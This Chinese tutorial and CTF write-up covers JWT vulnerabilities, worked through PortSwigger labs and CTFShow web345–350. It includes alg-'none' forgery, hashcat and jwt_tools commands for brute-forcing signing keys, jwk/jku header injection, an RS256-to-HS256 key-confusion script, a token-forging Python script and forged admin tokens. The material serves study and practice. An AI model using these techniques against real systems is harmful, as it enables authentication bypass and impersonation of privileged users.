## 前言

**JWT简单的介绍**

JWT的优缺点
基于session和基于jwt的方式的主要区别就是用户的状态保存的位置，session是保存在服务端的，而jwt是保存在客户端的。自身包含了认证鉴权所需要的所有信息，服务器端无需对其存储，从而给服务器减少了存储开销。

1可扩展性好，

2无状态jwt不在服务端存储任何状态

JWT长什么样？
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ

看着与BASE64加密很像，但其中的+，/分别会被替换为减号（-）和下划线（_）

“=”等号是被去掉的

JWT的过程
1服务端根据用户登录信息，将信息生成token，返给客户端

2客户端收到服务端返回的token，存储在cookie中

3客户端携带token信息发送到服务端 ,以放在http请求头信息中，如：Authorization字段里面

4服务端检验token的合法性，如何合法，则成功，完成相应的响应

jwt的结构
jwt由三部分组成，每部分之间用.分隔，分别为
1、Header
2、Payload
3、Signature

Header
header示例如下：
{
“alg”: “HS256”,
“typ”: “JWT”
}

header由两部分组成，typ代表令牌的类型，也就是jwt，alg代表签名算法，常用的有hs256和rs256，分别代表HMAC和RSA

Payload
iss: jwt签发者
sub: jwt所面向的用户
aud: 接收jwt的一方
exp: jwt的过期时间，这个过期时间必须要大于签发时间
nbf: 定义在什么时间之前，该jwt都是不可用的.
iat: jwt的签发时间
jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。
{

"sub": "1234567890",

"name": "John Doe",

"iat": 1516239022

}

Signature
要创建签名部分，必须获取已编码的标头（header）、编码的有效负载（payload）、密钥、header中指定的算法，并对其进行签名。

签名用于验证信息在传输过程中是否被篡改，并且在使用私钥签名令牌的情况下，它还可以验证 JWT 的发送者是否正确。

由三部分组成

header

payload

secret

这个部分需要base64url后的header和base64url后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。

var encodedString = base64UrlEncode(header) + '.' + base64UrlEncode(payload);

var signature = HMACSHA256(encodedString, 'secret');

注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。



**JWT的格式**

JWT 由 3 部分组成：header,  payload,  signature。它们各用一个点分隔（JWT格式：`Header.Payload.Signature`），如以下示例所示：

![img](assets/1683535426233-da5d47d7-11e1-4d8e-979a-5b0019c73dd9.png)

JWT 的标头和有效负载部分只是 base64url 编码的 JSON 对象。标头包含有关令牌本身的元数据，而有效负载包含有关用户的实际“声明”。



JWT解码：https://jwt.io/

![img](assets/1683246765720-a3d9b664-3f01-4521-9e05-1626bfc4eb1a.png)



Header

说明了加密算法，和 Token 类型

```json
{
  "alg":"RSA",		# 加密算法
  "typ":"JWT"			# Token类型
}
```

Payload

可以自定义，含用户数据信息等参数，通过修改参数，有可能进行越权查看其他用户信息。

```bash
{
  "sub": "1234567890",
  "name": "Helen",
  "admin": true
}
```

Signature

```bash
Signature = HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload),"secret")
```

secret 保存在后端，就是来解析确定验证的 key。

## 0x01 JWT流量特征

1、`eyJ`开头，`eyJ`base64解密之后是`{"`。

![img](assets/1683247573280-bbc62abc-2746-469a-bd97-1bbca309a822.png)

2、使用 Burpsuite 插件：`JWT Editor Keys`。

![img](assets/1683247669896-b4542bf2-3e8f-42da-8428-0a3a4567f914.png)



## 0x02 JWT潜在的漏洞

### 1）签名未验证-绕过方式一

-	**漏洞验证	-**

在线靶场：通过未经验证的签名绕过 JWT 身份验证（`JWT authentication bypass via unverified signature`）

signature  后端没有对`header`内的`alg`value 进行校验。

1、

先登录`wiener:peter`账户，在`burp suite`中直接双击JWT可以直接以句号分隔，在右边的inspector选项卡中会自动对它进行解码，不过并不支持一起全部解码，只能一段一段的查看。

这里可以明显看到解码后的结果有一个wiener的用户名。

![img](assets/1683436915205-88bd2f65-c1c4-4059-9c3a-10e379fc030a.png)

随后我们使用`wiener`用户访问`/admin`路径，响应包显示没有权限访问。

![img](assets/1683437084144-ad5b93c6-e9cf-428e-9e29-e6dec04e32f3.png)

直接在在右边的 **inspector** 选项卡中对`"sub":""`参数进行用户名修改，改为`"sub":"administrator"`，再次访问`/admin`路径，发现访问成功。签名未对用户名进行校验。

![img](assets/1683437276105-3a424111-9ce6-4161-aec5-10143d82a878.png)

在响应中，找到用于删除 `Carlos` ( `/admin/delete?username=carlos`) 的 URL。

![img](assets/1683438085722-fd2f4067-20aa-4e2a-a44d-f56cfe96579e.png)

删除用户成功后，响应包显示 302 跳转。

![img](assets/1683438172088-2465d60a-8d72-4bb7-b347-24e93fcc02e8.png)

再次查看 `/admin` 响应包，发现`Carlos`用户信息已经被删除。

![img](assets/1683438321090-6d755cb3-b8ab-4d11-8289-29427796cd4c.png)

------

### 2）签名未验证-绕过方式二

在Header中，设置alg的值可以选择签名方式，就像前面的介绍，可以选择HS256，即HMAC和SHA256。在某些情况下可以设置为None，即不签名，但是一般都会过滤这种危险的设置，实战中较少，可以尝试大小写等等绕过。

在线靶场：

1、将改为`"alg":"none"`。

![img](assets/1683439061578-b636a446-6623-4e9a-8538-0e80b4a9d1ce.png)

2、将改为`"sub":"administrator"`。

![img](assets/1683440173129-d2eec972-fc84-46b1-8a17-4ad8d9d72f10.png)

3、删除 JWT 的 signature 字段。

![img](assets/1683440264105-d3bcc89a-5086-40a3-9c2c-e531ea358455.png)

虽后再访问`/admin`路径就正常了。

![img](assets/1683440328675-a9b1bf05-4a51-4377-bad8-c6838972f534.png)

------

### 3）弱密钥可被暴力破解

```
JWT authentication bypass via weak signing key
```

一些签名算法，例如 HS256 (HMAC + SHA-256)，使用任意的独立字符串作为密钥。就像密码一样，重要的是这个秘密不能轻易被攻击者猜到或暴力破解。否则，他们可能能够使用他们喜欢的任何标头和有效负载值创建 JWT，然后使用密钥重新签署具有有效签名的令牌。



在实施 JWT 应用程序时，开发人员有时会犯错误，例如忘记更改默认或占位符机密。他们甚至可能复制并粘贴他们在网上找到的代码片段，然后忘记更改作为示例提供的硬编码秘密。在这种情况下，攻击者使用众所周知的秘密单词列表来暴力破解服务器的秘密可能是微不足道的。



**漏洞检测**

使这里使用的是hashcat，进行破解（Kali上自带这款工具），使用语句如下：

`jwt.secrets.list`密钥列表地址：https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

```bash
hashcat -a 0 -m 16500 <jwt> <wordlist>

// 示例：hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list

// 这是对 Hashcat 命令的参数解释：

- `-a 0`: 这个参数指定了攻击模式。`0` 表示字典攻击模式，也就是使用一个密码字典来尝试破解。在这种模式下，Hashcat 会将字典中的每个单词都与哈希值进行比较，直到找到匹配的密码为止。
- `-m 16500`: 这个参数指定了要破解的哈希类型。`16500` 表示 Json Web Token (JWT) 的哈希类型。Hashcat 需要知道要破解的哈希类型才能正确地对其进行处理。
- `<jwt>`: 这个参数指定了要破解的 JWT 哈希值。Hashcat 将使用所选的攻击模式和密码字典来尝试破解该哈希值。
- `<wordlist>`: 这个参数指定了要用于字典攻击的单词列表文件路径。Hashcat 将使用该列表中包含的单词来尝试破解 JWT 哈希值。
```

![img](assets/1683462666283-c016a56c-1af4-46e3-8c06-6b426fef4d19.png)

![img](assets/1683462695247-6244f132-de03-49b1-a3ae-c4260c816e8d.png)

爆破成功，得到弱密钥：`secret1`。并在 https://jwt.io/ 对原来的密钥进行编码处理

![img](assets/1683464202178-f300e241-4718-4528-ba44-dfca34e93e70.png)

成功访问到 `/admin` 路径下的页面。

![img](assets/1683464012471-d5b72d4b-4ef5-4023-813f-aa5ecb2c3719.png)

------

### 4）通过 jwk 参数注入自签名 JWT

```
JWT authentication bypass via jwk header injection
```

首先在插件`JWT Editor key`中产生`NEW RSA Key`，选择RSA选项，点击生成即可

![img](assets/1683470149383-eaec63ed-0fb0-40df-95ea-bf7ee21d4516.png)

在repeater中改到JWT编辑界面，选择下面的嵌入JWK 进行攻击。

![img](assets/1683470268794-a392326f-3990-4b3f-95ee-15d73da3f948.png)

在弹窗中选择你产生的RSA密钥对

![img](assets/1683470288981-bbeb60e3-956e-4ae8-9edd-fdb7dfe3a4a7.png)

![img](assets/1683470645609-d9b3dfbd-a98b-4f06-b542-c7d697891acc.png)

成功访问管理员页面。

![img](assets/1683470944815-6bcf1701-d0e3-405a-b36e-1d7760579e79.png)

------

### 5）通过 jku 参数注入自签名 JWT

```
JWT authentication bypass via jku header injection
```



1、首先我们使用`wiener`用户是没有权限访问`/admin`路径的。

![img](assets/1683537883964-e15e6332-006c-42e2-85f2-a0452810ac17.png)

2、回到浏览器，点击`Go to exploit server`跳转至EXP生成页面，生成EXP。

![img](assets/1683537967457-c39a33dc-5064-4118-a983-03729db77dd4.png)

3、将`Body`内的信息替换为如下内容：

```bash
{
    "keys": [

    ]
}
```

![img](assets/1683538248945-49712fb8-89fe-4240-b0e7-3e07a6feb642.png)

4、再回到Brupsuite 的`JWT editor Keys`，点击`**New RSA Key** `生成一个新的key，然后右键复制`**Copy Public Key as JWK**`将复制到的Keys粘贴到刚才的`Body`内，并点击Store保存，如下所示：

![img](assets/1683538655170-8b1dd8b1-e612-499d-b35b-c414df40aa99.png)

![img](assets/1683538826906-5b214a7d-a622-406b-9882-a6008e6cf4f5.png)

5、随后复制顶部出现的URL地址，后边会用到。![img](assets/1683538877669-6e540778-711b-47d8-be95-10ff736e8395.png)

6、回到Repeter，点击`JSON Web Token`编辑面板，在`Header`面板内编辑。

![img](assets/1683539496835-9815fd51-fa56-4ae5-bd77-b968f5167d7c.png)

![img](assets/1683539710334-27f8b45c-9be8-460c-82ed-6e27a76663b6.png)

7、点击底部的`Sign`，选择刚才生成的RSA生成签名。

![img](assets/1683539742752-05c18b34-90a5-4b10-bfda-f37fdcc5affc.png)

8、成功访问到`/admin`路径。

![img](assets/1683537304487-cc5fd9e5-ec9c-4f87-af23-521855790838.png)

------

### 6）通过 kid 注入 JWT，与目录遍历攻击相结合

```
JWT authentication bypass via kid header path traversal
```

😂偷懒了，，没有写，可以参考底部的链接，或者官网给出的解题步骤进行实验。最重要的是要理解原理。



## 0x03 JWT安全问题的防护措施

- 使用最新的 JWT 库，虽然最新版本的稳定性有待商榷，但是安全性都是较高的。
- 对 jku 标头进行严格的白名单设置。
- 确保 kid 标头不容易受到通过 header 参数进行目录遍历或 SQL 注入的攻击。

## 0x04 例题解析

### web345

启动靶机，进入环境。一个熟悉的where is flag?

F12查看元素发现/admin的提示，说明需要伪造身份。

直接bp抓包，找到Token 放在jwt.io上面改，注意是/admin/

![](F:/CTFShow-Web/Web入门/jwt/web345/抓取Cookie.png)

获得了以下信息：

```
{
  "alg": "None",
  "typ": "jwt"
}
```

alg为None算法，无签名认证

下面构造payload：

```
[
  {
    "iss": "admin",
    "iat": 1696317561,
    "exp": 1696324761,
    "nbf": 1696317561,
    "sub": "user",
    "jti": "54faa4bd3108499bee219367c90bc09d"
  }
]
```

开始转换

```
eyJhbGciOiJIUzI1NiIsInR5cCI6Imp3dCJ9.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2OTYzMTc1NjEsImV4cCI6MTY5NjMyNDc2MSwibmJmIjoxNjk2MzE3NTYxLCJzdWIiOiJhZG1pbiIsImp0aSI6IjU0ZmFhNGJkMzEwODQ5OWJlZTIxOTM2N2M5MGJjMDlkIn1d.
```

由于无签名认证，只取前面的部分。

获得flag。

![](F:/CTFShow-Web/Web入门/jwt/web345/flag.png)



### web346

启动靶机，进入环境。一个熟悉的where is flag?

然后又是/admin，抓包

得到了Cookie:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5NjMyMDE5NiwiZXhwIjoxNjk2MzI3Mzk2LCJuYmYiOjE2OTYzMjAxOTYsInN1YiI6InVzZXIiLCJqdGkiOiI1ZmMwYWQwMWFkZTgzNDBmNGM2ODRiMzkyMDk5NjZhOCJ9.K4uexoNrg9Yw6bxg2e3GcoJTXvwXYC5HLQat0PjGzdw
```

![](F:/CTFShow-Web/Web入门/jwt/web346/Cookie检查.png)

HS256&Invalid Signature

使用None算法绕过签名，将alg更改为none。

构造payload：(此处必须使用脚本)

```
eyJhbGciOiAiTm9uZSIsInR5cCI6ICJKV1QifQ.eyJpc3MiOiAiYWRtaW4iLCJpYXQiOiAxNjk2MzIwMTk2LCJleHAiOiAxNjk2MzI3Mzk2LCJuYmYiOiAxNjk2MzIwMTk2LCJzdWIiOiAiYWRtaW4iLCJqdGkiOiAiNWZjMGFkMDFhZGU4MzQwZjRjNjg0YjM5MjA5OTY2YTgifSA.
```

重放，得到flag



### web347

启动靶机，进入环境。一个熟悉的where is flag?

然后又是/admin，抓包

Cookie:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5NjMyMTQ4OCwiZXhwIjoxNjk2MzI4Njg4LCJuYmYiOjE2OTYzMjE0ODgsInN1YiI6InVzZXIiLCJqdGkiOiJmZjczMGQ5Yjc5YTEyZWY5NTI2OTgyZjYxZDkxYjRiZCJ9.R_0R8ShiZNQNNle6H4s_prdGLLNJjbYm5YyenY7CJww
```

分析后得到HS256&Need Signature,所以得爆破密码。

```
hashcat -a 0 -m 16500
```

密钥为 123456

payload:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5NjMyMTQ4OCwiZXhwIjoxNjk2MzI4Njg4LCJuYmYiOjE2OTYzMjE0ODgsInN1YiI6ImFkbWluIiwianRpIjoiZmY3MzBkOWI3OWExMmVmOTUyNjk4MmY2MWQ5MWI0YmQifQ.9F9km5a71C0Pt-R-4EXMnCI_ot6WHut1kmS4ZR7Lf1U
```

拿到flag



### web348

同web347，继续爆破，得到密码为aaab

payload:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5NjMyMjQ1MiwiZXhwIjoxNjk2MzI5NjUyLCJuYmYiOjE2OTYzMjI0NTIsInN1YiI6ImFkbWluIiwianRpIjoiOGU0NDVlZTY4NzcyZmUzZjI1ZmFkNjllODE0MWZlOTcifQ.sjuE3NvuibTvFJa8p9HcGo_MZt5eaIxCm94RnbydWTg
```



### web349

附件：

```
/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var privateKey = fs.readFileSync(process.cwd()+'//public//private.key');
  var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' });
  res.cookie('auth',token);
  res.end('where is flag?');
  
});

router.post('/',function(req,res,next){
	var flag="flag_here";
	res.type('html');
	var auth = req.cookies.auth;
	var cert = fs.readFileSync(process.cwd()+'//public/public.key');  // get public key
	jwt.verify(auth, cert, function(err, decoded) {
	  if(decoded.user==='admin'){
	  	res.end(flag);
	  }else{
	  	res.end('you are not admin');
	  }
	});
});
```

需要公钥和私钥

访问/private.key /public.key 得到公钥密钥

public key

```
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNioS2aSHtu6WIU88oWzpShhkb
+r6QPBryJmdaR1a3ToD9sXDbeni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnX
YqlTJItOdHZio3Bi1J2Elxg8IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjA
bG1Naz58ibbtogeglQIDAQAB
-----END PUBLIC KEY-----
```



private key

```
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb+r6QPBryJmdaR1a3ToD9sXDb
eni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8
IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB
AoGAE+mAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2+OhYVEJq8VtPcVB1PK
frOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAX
h7iFjNscfs/Dp/BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydM
cdEBOgkI/E/EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R/hIW9JD1vlp62Qi
ST9LU4lxAkEA1lsfr9gF/9OdzAsPfuTLsl+l9zpo1jjzhXlwmHFgyCAn7gBKeWdv
ubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA
+tUDjQJAERSE/SvAb143BtkVdCLniVBI5sGomIOq569Z0+zdsaOqsZs60QJAYqtJ
V7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4+QgY+fYBt8DVFq5bHQUIvIW
zawYVGZdwvuD9IgY/QJAGCJbXA+Knw10B+g5tDZfVHsr6YYMY3Q24zVu4JXozWDV
x+G39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA==
-----END RSA PRIVATE KEY-----
```



导入得到jwt

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.NoE2xAUmDyHc0rhNtNtUn8URhEZeFGy9M0hd7hBEfRD3jpGqetn0nj2Tm9mob9LWyl2BazTLm_1Ez1vn0A6ZxgcpF73B6_rE4zrDvyu3b6eH3FtwmKd9I6N0KzkO1IpTggRVy6l4RoQCoG4JJ6X9YVJgOWtm0vgWzcjjXejlEsM
```

然后POST到根目录，拿到flag



### web350

```
router.get('/', function(req, res, next) {
  res.type('html');
  var privateKey = fs.readFileSync(process.cwd()+'//routes/private.key');
  var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' });
 
  res.cookie('auth',token);
  res.end('where is flag?');
  
});
 
router.post('/',function(req,res,next){
	var flag="flag_here";
	res.type('html');
	var auth = req.cookies.auth;
	var cert = fs.readFileSync(process.cwd()+'//routes/public.key');  // get public key
	jwt.verify(auth, cert,function(err, decoded) {
	  if(decoded.user==='admin'){
	  	res.end(flag);
	  }else{
	  	res.end('you are not admin'+err);
	  }
	});
});

```

哦，看来又有公钥和私钥，**然而这次只拿到了公钥。**

这里我们可以利用：将RS256算法改为HS256（非对称密码算法=>对称密码算法）

绕过服务端签名检测，从而构造JWT

解释：   

        HS256算法使用密钥为所有消息进行签名和验证。
    
        而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。

如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。

        由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。
    
        这样的话，后端代码使用RSA公钥+HS256算法进行签名验证

把原来的脚本修改一下

```
const jwt = require('jsonwebtoken');
var fs = require('fs');
var privateKey = fs.readFileSync('public.key');
var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'HS256' });
console.log(token)
```

jwt payload:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2OTYzMzU0Njd9.VZuPjTj3neBAFdRAOGKWXmyugvAkws8Tm0s37UyQPug
```

VScode也有bug啊。

终于拿到flag了，环境坑我不浅。

恭喜AK！



## 0x05 相关实操（解码、爆破密钥、伪造jwt生成）

**jwt解码**：可以放到burp中，用json web tokens插件解码，当然也可以自己分段base64解码

![image-20231121112142787](assets/image-20231121112142787.png)

**jwt密钥爆破**：

- 已知`JWT`使用的加密算法
- 已知一段有效的、已签名的`token`
- 签名使用的密钥是弱密钥（可以爆破出来）

```
python jwt_tools.py <jwt字符串> -C -d 字典

参数-C表示对JWT进行压缩，以缩短字节长度。
参数-d指定了一个字典文件jwtboom.txt，该文件包含用于尝试破解JWT的可能密钥列表。
```

![image-20231121112821764](assets/image-20231121112821764.png)

**jwt伪造生成**：

1.利用上面爆破得到密钥：用脚本加密(当然也可能设置加密算法为 none 这样就不需要密钥了，这里是无需密钥的加密脚本)

```python
import time
import jwt
# payload
token_dict={
  "iss": "admin",
  "iat": 1610440091,
  "exp": 1610447291,
  "nbf": 1610440091,
  "sub": "admin",
  "jti": "c3e3e96488b75f4368ba8684e4cebee4"
}
# headers
headers = {
  "alg": "HS256",
  "typ": "JWT"
}
jwt_token = jwt.encode(token_dict,  # payload, 有效载体
                     key='123456',  #爆破得到的密钥放这里
                       headers=headers,  # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
                       algorithm="HS256",  # 指明签名算法方式, 默认也是HS256
                       )  # python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str
print(jwt_token)
```

得到伪造的密钥之后，替换登陆即可。